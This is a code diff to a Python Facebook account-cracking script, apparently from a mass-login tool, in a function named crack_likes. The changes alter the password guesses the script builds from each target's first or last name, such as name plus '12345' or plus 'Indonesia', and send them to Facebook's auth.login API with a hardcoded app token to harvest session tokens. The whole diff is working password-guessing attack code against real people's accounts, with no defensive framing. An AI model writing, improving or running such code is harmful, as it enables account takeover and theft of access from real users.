@@ -461,7 +461,7 @@ def crack_likes():
 							cek.close()
 							cekpoint.append(zowe)
 						else:
-							bos3 = j['first_name']+'123'
+							bos3 = j['first_name']+'12345'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							ko = json.load(data)
 							if 'access_token' in ko:
@@ -475,7 +475,7 @@ def crack_likes():
 									cek.close()
 									cekpoint.append(zowe)
 								else:
-									bos4 = j['first_name']+'321'
+									bos4 = j['first_name']+'123456'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									ko = json.load(data)
 									if 'access_token' in ko:
@@ -489,7 +489,7 @@ def crack_likes():
 											cek.close()
 											cekpoint.append(zowe)
 										else:
-											bos5 = j['last_name']+'123'
+											bos5 = j['last_name']+'Indonesia'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											ko = json.load(data)
 											if 'access_token' in ko:
